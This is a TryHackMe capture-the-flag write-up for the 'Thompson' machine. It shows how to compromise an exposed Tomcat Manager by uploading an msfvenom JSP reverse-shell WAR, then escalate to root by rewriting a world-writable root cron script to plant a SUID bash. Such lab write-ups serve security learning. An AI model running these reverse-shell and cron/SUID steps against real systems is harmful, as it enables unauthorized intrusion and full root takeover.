# Thompson TryHackMe Writeup

## Overview

This machine focuses on exploiting an exposed Apache Tomcat instance to gain initial access, followed by privilege escalation via a misconfigured cron job.

---

## Enumeration

### Nmap Scan

```bash
nmap -sC -sV -p- <TARGET_IP>
```

Key findings:

* Apache Tomcat 8.5.5 running on port 8080
* HTTP service accessible

---

## Initial Access

### Access Tomcat Manager

Navigate to:

```
http://<TARGET_IP>:8080/manager/html
```

Obtain valid credentials via enumeration or brute force.

---

### Generate Reverse Shell WAR

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f raw > shell.jsp
```

---

### Create Proper WAR Structure

```bash
mkdir -p shell/WEB-INF
mv shell.jsp shell/
```

Create `web.xml`:

```xml
<web-app>
  <servlet>
    <servlet-name>shell</servlet-name>
    <jsp-file>/shell.jsp</jsp-file>
  </servlet>

  <servlet-mapping>
    <servlet-name>shell</servlet-name>
    <url-pattern>/</url-pattern>
  </servlet-mapping>
</web-app>
```

---

### Package WAR

```bash
cd shell
jar -cvf shell.war *
```

---

### Upload WAR

* Go to Tomcat Manager
* Upload `shell.war`
* Ensure status shows **running (true)**

---

### Get Reverse Shell

Start listener:

```bash
nc -lvnp 4444
```

Trigger:

```
http://<TARGET_IP>:8080/shell/
```

---

## Post Exploitation

### Upgrade Shell (optional)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Privilege Escalation

### Check User Directory

```bash
cd /home/jack
ls
```

Files found:

```
id.sh
test.txt
user.txt
```

---

### Analyze Cron Execution

```bash
cat test.txt
```

Output:

```
uid=0(root) gid=0(root)
```

Insight:

* `id.sh` is being executed as **root via cron**

---

### Check Permissions

```bash
ls -l id.sh
```

```
-rwxrwxrwx 1 jack jack ...
```

* World-writable script
* Executed by root → privilege escalation vector

---

## Exploitation

### Modify Existing Script

Due to restricted shell, direct redirection may fail. Use `tee`:

```bash
echo '#!/bin/bash' | tee id.sh
echo 'cp /bin/bash /tmp/rootbash' | tee -a id.sh
echo 'chmod 4755 /tmp/rootbash' | tee -a id.sh
```

---

### Wait for Cron Execution

Wait ~60 seconds.

---

### Verify SUID Binary

```bash
ls -l /tmp/rootbash
```

Expected:

```
-rwsr-xr-x 1 root root ...
```

---

### Get Root Shell

```bash
/tmp/rootbash -p
whoami
```

Output:

```
root
```

---

## Flags

### User Flag

```bash
cat /home/jack/user.txt
```

---

### Root Flag

```bash
cat /root/root.txt
```

---

## Key Takeaways

* Tomcat WAR deployment requires correct structure
* Always verify application status in Tomcat Manager
* Cron jobs executing writable scripts are critical privilege escalation vectors
* Restricted shells may block `>` redirection → use `tee`
* SUID binaries provide persistent root access

---

## Final Notes

This machine demonstrates:

* Web exploitation via Tomcat Manager
* Payload deployment pitfalls
* Real-world privilege escalation via cron misconfiguration

---
